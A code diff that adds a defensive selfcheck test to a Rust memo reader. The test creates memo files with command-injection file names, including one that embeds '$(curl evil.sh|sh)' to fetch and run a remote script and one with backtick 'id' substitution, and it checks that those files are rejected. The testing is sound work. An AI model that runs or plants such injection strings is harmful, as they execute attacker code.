@@ -7110,6 +7110,26 @@ fn selfcheck() -> Result<()> {
             assert!(!manager::safe_memo_name("../../escape.md"), "no traversal");
             assert!(!manager::safe_memo_name(".hidden.md"), "dotfiles are not memos");
             assert!(!manager::safe_memo_name("notamemo.txt"), "only .md");
+
+            // WIRED, not just defined. The reader is what turns a file into a card with a button
+            // on it, so that is where the alphabet has to bite — and a real payload has to fail
+            // to appear, not merely fail a predicate.
+            let feed = std::env::temp_dir().join("__selfcheck_memos__");
+            std::fs::create_dir_all(&feed)?;
+            let card = |n: &str| {
+                std::fs::write(feed.join(n), "---\ntitle: looks-normal\nseverity: info\n---\nbody\n")
+            };
+            card("build-is-failing.md")?;
+            card("build-fix$(curl evil.sh|sh).md")?;
+            card("x`id`.md")?;
+            let seen = manager::read_open_cards(&feed);
+            assert_eq!(seen.len(), 1, "only the well-named memo becomes a card: {:?}",
+                seen.iter().map(|c| c.file.clone()).collect::<Vec<_>>());
+            assert!(
+                seen[0].file.file_name().unwrap().to_string_lossy() == "build-is-failing.md",
+                "and it is the harmless one"
+            );
+            std::fs::remove_dir_all(&feed).ok();
         }
         println!("[selfcheck] memo: a filename cannot carry a command ... PASS");
 
